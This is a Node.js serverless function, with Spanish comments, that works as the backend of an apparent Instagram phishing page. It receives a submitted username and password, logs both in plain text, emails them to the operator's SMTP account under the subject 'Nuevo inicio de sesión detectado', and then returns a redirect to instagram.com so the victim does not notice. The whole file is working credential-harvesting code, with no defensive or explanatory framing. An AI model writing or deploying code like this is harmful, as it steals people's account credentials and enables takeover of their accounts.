require('dotenv').config();
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  console.log('Función iniciada');
  
  // Añadir headers CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json'
  };

  // Manejar preflight OPTIONS request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    console.log('Método no permitido');
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Método no permitido' })
    };
  }

  try {
    const { username, password } = JSON.parse(event.body);
    console.log('Datos recibidos:', { username, password });
    
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      throw new Error('Configuración de email incompleta');
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    console.log('Transporter configurado');

    // Verificar conexión SMTP
    await transporter.verify();

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.SMTP_USER,
      subject: 'Nuevo inicio de sesión detectado',
      text: `Usuario: ${username}\nContraseña: ${password}`,
      html: `
        <h3>Nuevo inicio de sesión detectado</h3>
        <p><strong>Usuario:</strong> ${username}</p>
        <p><strong>Contraseña:</strong> ${password}</p>
      `
    };

    const info = await transporter.sendMail(mailOptions);

    console.log('Correo enviado:', info);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        messageId: info.messageId,
        redirectTo: 'https://www.instagram.com'
      })
    };

  } catch (error) {
    console.error('Error detallado:', error);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.message
      })
    };
  }
}; 